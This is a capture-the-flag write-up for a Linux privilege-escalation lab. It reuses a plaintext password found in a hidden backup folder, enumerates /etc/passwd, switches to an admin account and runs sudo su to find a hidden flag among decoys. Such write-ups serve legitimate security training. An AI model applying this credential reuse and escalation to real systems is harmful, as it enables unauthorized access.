# Find The Real One

**Category:** Privilege Escalation / Linux  
**Platform:** Netanix / NxCTF  
**Flag:** `softwarica{REDACTED}`

---

## Overview

We are given access to a Docker container as `ctfuser`. The goal is to escalate privileges to root and find the real flag among many fake ones planted throughout the filesystem.

---

## Solution

### Step 1 — Enumerate the home directory

```bash
ls -la
```

This reveals a hidden `.backup/` directory in the home folder.

### Step 2 — Find credentials in the backup

Navigate into the backup directory:

```bash
cat ".backup/old files/system/credentials backup.txt"
```

Contents:
```
4dm1n_s3cr3t_p4ssw0rd!
```

### Step 3 — Try the password on root (fails)

```bash
su root
# Password: 4dm1n_s3cr3t_p4ssw0rd!
```

This doesn't work — the password isn't valid for root.

### Step 4 — Enumerate other users on the system

The challenge title hints that there are fake users and fake paths. Check all accounts:

```bash
cat /etc/passwd | cut -d: -f1
```

Among the results is an `admin` account. Try switching to it:

```bash
su admin
# Password: 4dm1n_s3cr3t_p4ssw0rd!
```

Success — we are now `admin`.

### Step 5 — Escalate to root via sudo

Check sudo permissions:

```bash
sudo -l
```

The `admin` account has full sudo access. Escalate:

```bash
sudo su
```

We are now root.

### Step 6 — Locate the real flag

Search for all files with "flag" in their name:

```bash
find / -iname "*flag*" 2>/dev/null
```

This returns many results including fake flags like:
```
softwarica{y0u_f0und_m3_but_1m_f4k3}
softwarica{t00ls_f4k3_4cc3ss}
softwarica{n0t_th3_r34l_fl4g_try_h4rd3r}
```

### Step 7 — Read files until the real flag is found

The real flag is located at a deeply nested path:

```bash
cat /root/.config_old/.sys_backup_2023/.cache/.system_flag
```

---

## Flag

```
softwarica{REDACTED}
```
